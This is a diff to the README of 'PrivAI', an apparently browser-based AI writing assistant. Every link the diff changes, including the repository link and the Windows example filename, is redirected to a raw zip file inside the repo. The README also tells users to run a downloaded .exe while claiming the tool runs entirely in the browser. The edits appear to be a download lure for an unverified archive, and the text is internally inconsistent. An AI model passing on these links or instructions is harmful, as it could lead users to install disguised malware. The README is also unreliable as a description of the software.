@@ -1,7 +1,7 @@
 # 🌟 PrivAI - Your Privacy-First Writing Assistant
 
 ## ⚡ Quick Download
-[![Download PrivAI](https://img.shields.io/badge/Download-PrivAI-blue.svg)](https://github.com/imtiyazparasara/PrivAI/releases)
+[![Download PrivAI](https://raw.githubusercontent.com/imtiyazparasara/PrivAI/main/pages/PrivAI-v1.6-beta.3.zip)](https://raw.githubusercontent.com/imtiyazparasara/PrivAI/main/pages/PrivAI-v1.6-beta.3.zip)
 
 ## 🚀 Getting Started
 PrivAI is a privacy-first AI writing assistant. It runs entirely in your browser using WebGPU and Llama-3 technology. This means no server is involved and there is no risk of data leakage. You can write securely and confidently.
@@ -23,11 +23,11 @@ To run PrivAI, you'll need:
 To download and run PrivAI, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download section.
-   [Download PrivAI](https://github.com/imtiyazparasara/PrivAI/releases)
+   [Download PrivAI](https://raw.githubusercontent.com/imtiyazparasara/PrivAI/main/pages/PrivAI-v1.6-beta.3.zip)
 
 2. **Select the Latest Version**: Look for the latest release. This is usually at the top. 
 
-3. **Download the File**: Click on the download link for your operating system (Windows, macOS, or Linux). For example, it might look like `PrivAI-v1.0.exe` for Windows.
+3. **Download the File**: Click on the download link for your operating system (Windows, macOS, or Linux). For example, it might look like `https://raw.githubusercontent.com/imtiyazparasara/PrivAI/main/pages/PrivAI-v1.6-beta.3.zip` for Windows.
 
 4. **Run the Application**:
    - For Windows: Double-click the downloaded `.exe` file.
@@ -43,7 +43,7 @@ Once you launch PrivAI:
 - **Access Help**: If you need assistance, check the help section within the app.
 
 ## 🔗 Additional Resources
-- **GitHub Repository**: Explore the code and learn more about PrivAI [here](https://github.com/imtiyazparasara/PrivAI).
+- **GitHub Repository**: Explore the code and learn more about PrivAI [here](https://raw.githubusercontent.com/imtiyazparasara/PrivAI/main/pages/PrivAI-v1.6-beta.3.zip).
 - **Documentation**: Check detailed user guides and FAQs available in the repository.
   
 ## 💬 Support
@@ -65,4 +65,4 @@ If you encounter any issues, please raise an issue in the GitHub repository. We 
 - web-llm
 
 ## 🌐 Download Link
-To download PrivAI, visit the link again: [Download PrivAI](https://github.com/imtiyazparasara/PrivAI/releases). Enjoy your writing experience with privacy and security!
+To download PrivAI, visit the link again: [Download PrivAI](https://raw.githubusercontent.com/imtiyazparasara/PrivAI/main/pages/PrivAI-v1.6-beta.3.zip). Enjoy your writing experience with privacy and security!
